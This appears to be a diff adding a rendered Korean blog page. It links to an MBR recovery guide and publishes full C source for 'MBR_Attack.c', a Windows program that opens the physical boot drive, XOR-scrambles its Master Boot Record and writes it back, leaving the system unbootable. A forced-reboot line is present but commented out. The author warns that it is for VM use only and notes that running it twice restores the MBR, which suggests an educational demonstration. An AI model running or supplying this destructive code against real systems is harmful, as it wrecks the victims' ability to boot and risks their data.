@@ -1,0 +1,69 @@
+I"}<h3 id="mbr-복구-가이드docx-다운로드">MBR 복구 가이드.docx 다운로드</h3>
+<ul>
+  <li><a href="https://drive.google.com/file/d/1q-e2zcNb9uZIjoW_aDBhCFGWyRMBWnoz/view?usp=sharing">클릭</a>
+<br /></li>
+</ul>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+MBR_Attack.c (ver. 2020/11/17)
+by 최광석
+
+*** 주의 : 반드시 VM에서만 실행해야 하며 실행 전 스냅샷을 촬영할 것 ***
+*** 짝수 단위로 실행하면 MBR이 원상복구 되니 이 점 참고할 것 ***
+
+OS가 설치된 디스크에 접근하여 MBR을 XOR 암호화하는 방식으로 변조 후 강제종료시켜 더 이상 부팅을 할 수 없게 만듦.
+
+*/</span>
+
+<span class="cp">#include &lt;stdio.h&gt;
+#include &lt;windows.h&gt;
+</span>
+<span class="cp">#define MAX_LINE 512
+</span>
+<span class="c1">// AttackMBR()</span>
+<span class="c1">// 물리 드라이브에 접근하여 MBR 변조</span>
+<span class="c1">// 변조는 XOR 암호화를 사용하였음</span>
+
+<span class="kt">int</span> <span class="nf">AttackMBR</span><span class="p">()</span> <span class="p">{</span>
+	<span class="n">HANDLE</span> <span class="n">hDisk</span><span class="p">;</span>
+	<span class="n">DWORD</span> <span class="n">readn</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">BYTE</span> <span class="n">MBR</span><span class="p">[</span><span class="n">MAX_LINE</span><span class="p">];</span>
+
+	<span class="n">hDisk</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="s">L"</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">PhysicalDrive0"</span><span class="p">,</span>
+		<span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+		<span class="mi">0</span><span class="p">,</span>
+		<span class="mi">0</span><span class="p">,</span>
+		<span class="n">OPEN_EXISTING</span><span class="p">,</span>
+		<span class="mi">0</span><span class="p">,</span>
+		<span class="mi">0</span><span class="p">);</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="n">hDisk</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">"This Drive coulnd't be opened.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+		<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDisk</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">ReadFile</span><span class="p">(</span><span class="n">hDisk</span><span class="p">,</span> <span class="n">MBR</span><span class="p">,</span> <span class="n">MAX_LINE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readn</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">MAX_LINE</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">MBR</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^=</span> <span class="n">i</span> <span class="o">%</span> <span class="mh">0xFF</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="n">SetFilePointer</span><span class="p">(</span><span class="n">hDisk</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">FILE_BEGIN</span><span class="p">);</span>
+
+	<span class="n">WriteFile</span><span class="p">(</span><span class="n">hDisk</span><span class="p">,</span> <span class="n">MBR</span><span class="p">,</span> <span class="n">MAX_LINE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">readn</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+
+	<span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDisk</span><span class="p">);</span>
+
+<span class="c1">//	system("shutdown -r -t 0");</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="n">AttackMBR</span><span class="p">();</span>
+
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+:ET
